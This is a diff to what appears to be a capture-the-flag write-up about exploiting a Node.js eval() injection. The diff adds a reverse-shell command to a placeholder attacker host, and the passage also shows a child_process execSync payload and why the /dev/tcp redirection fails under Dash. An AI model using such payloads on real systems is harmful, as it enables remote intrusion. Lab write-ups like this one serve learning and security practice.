@@ -82,13 +82,11 @@ After confirming command execution, I used [revshells.com](https://www.revshells
 
 ![](/uploads/glitch_failed_rce.png)
 
-This photo is showing URL encoded payload: 
-
-I tried replacing the contents in .exec() with:
+This photo is showing URL encoded payload. Then I tried replacing the contents in .exec() with: `sh -i >& /dev/tcp/ATTACKER_IP/9001 0>&1`
 
 That also failed. I also tried other payloads but none seemed to work. 
 
-The most important lessson I learned here was that to pay attention to the context in which the payload was being executed. As Node.js `exec()` passes commands through `/bin/sh`, which is commonly linked to Dash on Ubuntu. Features such as `/dev/tcp` and`>&` redirection syntax are provided by Bash and are not supported on by Dash.
+The most important lesson I learned here was that to pay attention to the context in which the payload was being executed. As Node.js `exec()` passes commands through `/bin/sh`, which is commonly linked to Dash on Ubuntu. Features such as `/dev/tcp` and`>&` redirection syntax are provided by Bash and are not supported on by Dash.
 
 I looked back at the internal server issue before to try to understand the execution chain. Where it exposed eval() and Express, a Node.js-specific child_process test confirmed operating-system command execution, and inspection of /bin/sh with the command `require('child_process').execSync('readlink -f /bin/sh').toString()` as the payload confirmed the shell responsible for interpreting commands. 
 
